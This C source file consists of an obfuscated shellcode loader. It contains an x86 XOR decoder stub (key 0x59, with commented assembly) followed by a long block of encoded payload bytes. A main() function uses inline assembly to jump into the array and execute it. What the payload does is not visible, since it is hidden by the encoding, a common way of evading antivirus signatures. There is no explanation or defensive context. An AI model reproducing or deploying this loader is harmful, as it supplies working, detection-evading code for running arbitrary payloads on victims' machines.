char shellcode[] =
"\x83\xC0\x14"            //ADD EAX,14
"\x33\xC9"                //XOR ECX,ECX
"\x8A\x1C\x08"            //MOV BL,BYTE PTR DS:[EAX+ECX]
"\x80\xF3\x59"            //XOR BL,59
                          //notice 0x59 is taken as temp key to decode!
"\x88\x1C\x08"            //MOV BYTE PRT DS:[EAX+ECX],BL
"\x41"                    //INC ECX
"\x80\xFB\x90"            //CMP BL,90
"\x75\xF1"                //JNZ SHORT decoder.00401034
"\x82\x97\xe6\x79\xce\x7b\xc7\x80\x2d\x7d\xad\x04\x6a\x90\xe8\x3f"
"\x68\x24\x40\xda\xb4\xa5\x5a\x24\x4c\x9b\x3b\xa2\x30\x82\xa0\x81"
"\x38\x3d\x6c\x96\x31\xd7\x34\x7f\xfd\x46\x97\x50\x14\x1c\x2b\xdb"
"\x14\x23\x56\x1a\x15\xe4\xe6\x9e\x4b\x89\x8d\xab\x3d\x47\x1e\x73"
"\xae\x9a\x4c\x8a\x93\xda\x34\xf3\xb3\xd3\x8a\x65\x0e\xf5\x8c\x2b"
"\x89\x36\x49\xcf\xf0\x7c\xd5\xf6\x66\xc1\xa4\xb7\xa2\xe4\xca\xd7"
"\xda\x1e\x08\x47\xf6\x0a\x95\x3d\x54\x7f\xae\x82\xb7\x8f\x66\x48"
"\xbc\xb5\xed\xd6\x3c\xaa\x79\x46\x38\xf4\x71\xe5\x9f\x8c\x79\xaf"
"\x69\xb7\x7f\xef\x3b\xc7\x05\xe5\x2c\xd8\x7c\x50\x4b\x46\x6d\x8d"
"\x1d\x0f\x83\x77\x97\xb3\xd4\xcf\xc1\xff\xfe\x19\xd8\x7d\xd5\x55"
"\x57\x62\x72\x42\xb0\x07\xac\xbe\x0e\xf4\x9d\x24\x98\x38\x22\x78"
"\x94\x98\x15\x77\x18\xc1\x55\x7c\xf0\x6c\x31\x45\x78\x37\x55\x23"
"\xb3\x8b\x16\xdf\xa2\x2a\xcb\xaf\x95\xb2\x8e\x15\xa4\x61\x94\x92"
"\xf1\xae\x2d\x10\x26\x5b\xdc\x0f\x24\xac\x06\x8f\xb8\x05\xa0\x95"
"\x4e\x8f\x52\x32\x50\xad\x88\x67\x3a\x92\x47\x5f\x86\xa8\x64\xf5"
"\xfd\x3c\xea\x1d\x1a\x12\x9d\x04\x6a\x66\x32\x0c\xee\x47\x7e\x9a"
"\x9c\x04\xe8\x8b\x67\x1a\x51\xf9\xeb\xed\x14\x6e\x49\x83\xb1\xcb"
"\xc7\x9c\x74\x8b\x8f\xb8\x02\x35\x49\x51\x7c\x68\x2f\xa8\x96\x9c"
"\x8f\x03\xfe\x35\xc0\x83\x69\x28\xac\x90\xe8\x26\x62\x23\xad\xb9"
"\x49\x1c\x75\x76\x33\x45\xb5\xbb\xea\x12\xe1\x24\xa0\x25\x66\x21"
"\x53\xce\x0e\x68\x07\x8f\x3d\xc1\x3f\x01\xa0\xfb\x66\x0e\x2f\xab"
"\xfe\xfa\x7a\xf7\x16\x79\xd9\x50\x52\xc8\x1e\x62\x5b\xb6\xa4\x6a"
"\x3c\x2f\x18\xe3\xbe\x57\x9a\x87\xf2\xb3\xcb\x14\x13\x78\x71\xb0"
"\x4a\xfe\x52\x82\x73\x56\x79\xbe\x7c\x91\xc9\x6b\x5b\xd8\x5c\xa2"
"\xc1\x26\x2a\xcb\xe3\x1f\x0a\xc1\x0f\x62\x94\xa8\x76\x43\xac\xad"
"\x10\xd9\xe4\x93\x62\x46\xd3\x4e\x5b\x28\x1f\xdf\xd0\xfd\x50\x35"
"\x74\x73\xf5\xc3\x12\x07\xbc\x87\x91\xec\x81\xad\xcf\xcf\xb4\xca"
"\x9f";
int main()
{
    __asm
    {
        lea eax,shellcode
        push eax
        ret
    }
}
